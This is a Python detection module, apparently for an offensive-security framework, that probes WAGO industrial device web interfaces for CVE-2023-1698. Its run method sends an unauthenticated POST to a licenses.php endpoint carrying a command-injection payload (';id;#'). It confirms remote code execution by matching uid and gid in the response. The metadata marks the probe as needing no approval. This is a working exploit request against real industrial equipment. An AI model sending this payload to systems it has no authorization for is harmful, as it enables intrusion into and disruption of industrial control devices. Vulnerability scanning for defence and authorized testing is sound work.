#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In multiple products of WAGO, a vulnerability allows an unauthenticated, remote attacker to create new users a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WAGO - Remote Command Execution Detection',
        'description': 'In multiple products of WAGO, a vulnerability allows an unauthenticated, remote attacker to create new users and change the device configuration which can result in unintended behavior, Denial of Service, and full system compromise.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'wago', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://onekey.com/blog/security-advisory-wago-unauthenticated-remote-command-execution/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-1698',
            'https://cert.vde.com/en/advisories/VDE-2023-007/',
            'https://github.com/codeb0ss/CVE-2023-1698-PoC',
            'https://github.com/deIndra/CVE-2023-1698',
        ],
        'cve': 'CVE-2023-1698',
    }

    def run(self):
        path = '/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='{"package":";id;#"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"license":', '"name":', 'uid=', 'gid=',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='WAGO - Remote Command Execution detected', path=path)
            return True
        return False

